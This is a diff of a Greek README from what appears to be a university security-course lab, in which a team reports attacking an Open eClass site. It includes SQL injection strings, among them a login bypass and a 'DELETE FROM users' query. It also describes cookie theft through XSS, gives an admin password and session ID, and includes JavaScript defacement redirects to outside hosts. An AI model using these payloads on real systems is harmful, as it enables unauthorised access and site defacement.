@@ -47,6 +47,7 @@ To site είναι διαθέσιμο στο http://localhost:8001/. Την πρ
 - 1115201800022, Μιχάλης Βολάκης
 
 ## Defenses
+
 ### CSRF Token
 
 Προσθέσαμε ένα CSRF Token για κάθε CRUD action μπορεί να γίνει στο site.
@@ -133,28 +134,33 @@ $encoded_dropbox_filename = bin2hex(openssl_random_pseudo_bytes(32)) . $dropbox_
 Έτσι επιλέξαμε τον κωδικό του admin από το user table και είδαμε ότι εμφανίζεται στο breadcrumb. Δυστυχώς όμως ο κωδικός αποθηκεύεται στην βάση αφότου γίνει MD5 hash και δοκιμάσαμε να τον κάνουμε decrypt χωρίς όμως κάποια επιτυχία.
 
 Προσπαθήσαμε να πειραματιστούμε με το login page εισάγοντας τα εξής credentials:
+
 > username: drunkadmin
-> 
+>
 > password: ' OR 1=1;
 
 ώστε να κάνουμε escape τα quotes από το select query. Απ'ότι φαινόταν όμως τα queries είχαν προστατευθεί με htmlspecialchars και prepared statements εφόσον δεν καταφέραμε να δούμε τα αποτελέσματα του select.
 
 Δοκιμάσαμε επίσης να εκμεταλλευτούμε τα db queries που γίνονται στην υποβολή εργασιών και συγκεκριμένα στα σχόλια της εργασίας:
+
 ```sql
 '); SELECT * FROM logins; --
 '); DELETE FROM users; --
 ') OR 1=1; --
 ```
+
 Σε όλες τις περιπτώσεις τα queries απέτυχαν επειδή η mysql_query δεν υποστηρίζει multiple statements οπότε το μόνο που εμφανιζόταν ήταν ότι υπήρχε syntax error στο query.
 
 Παρατηρήσαμε επίσης ότι στην σελίδα για την αναβάθμιση της βάσης (upgrade/index.php) δεν χρειάζεται κάποιο session id διαχειριστή αλλά υπάρχει ξεχωριστό login page. Θεωρώντας απίθανο να έχει προστατευθεί και αυτό όσο το login στο index.php δοκιμάσαμε να κάνουμε και εκεί sql injection:
+
 > username: ' OR user.user_id='1' OR '5'='2;
-> 
+>
 > password: ' OR user.user_id='1' OR '5'='2;
 
 Πράγματι οδηγηθήκαμε στην σελίδα αναβάθμισης της βάσης και ανοίγοντας το eclass σε ξεχωριστό tab είδαμε ότι είχαμε admin access στο μάθημα. Επομένως μπορούσαμε να επεξεργαστούμε το μάθημα, να ενεργοποιήσουμε/απενεργοποιήσουμε εργαλεία κτλ. Δυστυχώς η διαχείριση πλατφόρμας δεν ήταν ενεργοποιημένη άρα το session id ήταν για user εκπαιδευτή και όχι για τον admin της πλατφόρμας. Σε επόμενο attack καταφέραμε να πάρουμε admin priviledges με XSS.
 
 ### XSS
+
 Παρατηρήσαμε ότι υπάρχει ευπάθεια στην περιοχή συζητήσεων του μαθήματος στο σημείο όπου δίνεται το query parameter topic στο reply.php όπου μπορούμε να κάνουμε escape το sql query και να εκτελέσουμε ένα JS script. Αρχικά δοκιμάσαμε να κάνουμε alert() για να ελέγξουμε αν εκτελείται το script και εφόσον είδαμε ότι εμφανίζεται το alert δοκιμάσαμε να κάνουμε redirect.
 
 Συγκεκριμένα με το εξής URL:
@@ -165,11 +171,10 @@ $encoded_dropbox_filename = bin2hex(openssl_random_pseudo_bytes(32)) . $dropbox_
 
 > PHPSESSID=2ggn0l7h3cgv3pdh47cvchh485
 
-
 Το επόμενο βήμα ήταν να κάνουμε login ως admin χρησιμοποιώντας το cookie που κλέψαμε και να μπούμε στο eclassconf.php για να δούμε τον κωδικό της βάσης (κάνοντας inspect εφόσον το html element είχε το password type). Ο κωδικός της βάσης είναι ο ίδιος με αυτόν του admin οπότε αλλάξαμε τον κωδικό για να έχουμε πρόσβαση και μετά την λήξη του session id:
 
 > Old password: CCV1Y8kJcj
-> 
+>
 > New password: abcdefg
 
 ### Deface
@@ -180,27 +185,32 @@ $encoded_dropbox_filename = bin2hex(openssl_random_pseudo_bytes(32)) . $dropbox_
 
 - Μπήκαμε στο phpmyadmin από το admin panel έτσι ώστε να εκτελέσουμε queries στην βάση χωρίς τους περιορισμούς(htmlspecialchars,intval) που υπήρχαν όταν κάναμε form submits. Η πρώτη μας ενέργεια ήταν να αλλάξουμε το description του μαθήματος με το εξής script:
 
-	```html
-	<script>
-		document.location = 'https://bit.ly/3PcmMm8';
-	</script>
-	```
+  ```html
+  <script>
+    document.location = 'https://bit.ly/3PcmMm8';
+  </script>
+  ```
 
-	Κάθε φορά που ο χρήστης προσπαθεί να μπει στο μάθημα θα γίνεται αυτόματα redirect στο shortened link που δίνουμε οδηγώντας τον σε ένα defaced site του kerberosclan. Έτσι δεν θα έχει πλέον πρόσβαση στα εργαλεία του μαθήματος.
+  Κάθε φορά που ο χρήστης προσπαθεί να μπει στο μάθημα θα γίνεται αυτόματα redirect στο shortened link που δίνουμε οδηγώντας τον σε ένα defaced site του kerberosclan. Έτσι δεν θα έχει πλέον πρόσβαση στα εργαλεία του μαθήματος.
 
 - Η τελευταία μας ενέργεια ήταν να αντικαταστήσουμε εξολοκλήρου την αρχική σελίδα με τον ίδιο τρόπο. Έτσι προσθέσαμε (από το phpmyadmin) ένα script στο description ενός admin announcement
-το οποίο φορτώνεται στο index.php και κάναμε redirect σε ένα GIF page με ένα skip button για να μην αποκλειστούμε εντελώς από την πλατφόρμα.
+  το οποίο φορτώνεται στο index.php και κάναμε redirect σε ένα GIF page με ένα skip button για να μην αποκλειστούμε εντελώς από την πλατφόρμα.
+
 ```html
 <script>
-const urlParams = new URLSearchParams(window.location.search);
-const param = urlParams.get("defaced");
-if(!param){
-document.location="http://kerberosclan.puppies.chatzi.org/skip.php"
-}
+  const urlParams = new URLSearchParams(window.location.search);
+  const param = urlParams.get('defaced');
+  if (!param) {
+    document.location = 'http://kerberosclan.puppies.chatzi.org/skip.php';
+  }
 </script>
 ```
+
 Για να επιστρέψουμε στην πλατφόρμα ελέγχουμε αν υπάρχει το query param "skip" και αν ναι επιστρέφουμε τον χρήστη στο πραγματικό index.php page.
 
-
 ## Επίλογος
-Από την στιγμή που είχαμε admin priviledges ήταν αναμενόμενο ότι θα μπορούσαμε να κάνουμε deface. Αν δεν είχαμε καταφέρει να μπούμε στα εργαλεία του admin θα δοκιμάζαμε κάποιο RFI ή CSRF attack ώστε να κάνουμε κάποιο action στέλνοντας ένα email στον admin. Επομένως το cookie stealer page μας ήταν αυτό που μας έδωσε την δυνατότητα να κάνουμε τις μεγάλες αλλαγές (deface) στο site. Επίσης συνειδητοποιήσαμε ότι τα περισσότερα είδη attacks είναι δύσκολα και αρκετά χρονοβόρα. Πόσο μάλλον σε περιπτώσεις όπου δεν γνωρίζουμε τον serverside code που εκτελείται ώστε να βρούμε κάποιο exploit. Μπορούμε να φανταστούμε πόσο πιο δύσκολο θα ήταν να κάνουμε το deface στο site όταν δεν έχουμε ήδη γνώση του κώδικα που εκτελείται στον server όπως είχαμε στα πλαίσια της εργασίας.
+
+Από την στιγμή που είχαμε admin priviledges ήταν αναμενόμενο ότι θα μπορούσαμε να κάνουμε deface. Αν δεν είχαμε καταφέρει να μπούμε στα εργαλεία του admin θα δοκιμάζαμε κάποιο RFI ή CSRF attack ώστε να κάνουμε επιθέσεις με μικρότερο αντίκτυπο (πχ. διαγραφή εργασίας). Επομένως το cookie stealer page μας ήταν αυτό που μας έδωσε την δυνατότητα να κάνουμε τις μεγάλες αλλαγές (deface) στο site.
+
+Επίσης συνειδητοποιήσαμε ότι τα περισσότερα είδη attacks είναι δύσκολα και αρκετά χρονοβόρα. Πόσο μάλλον σε περιπτώσεις όπου δεν γνωρίζουμε τον server-side code που εκτελείται ώστε να βρούμε κάποιο exploit.
+Μπορούμε να φανταστούμε πόσο πιο δύσκολο θα ήταν να κάνουμε το deface στο site όταν δεν έχουμε ήδη γνώση του κώδικα που εκτελείται στον server όπως είχαμε στα πλαίσια της εργασίας.
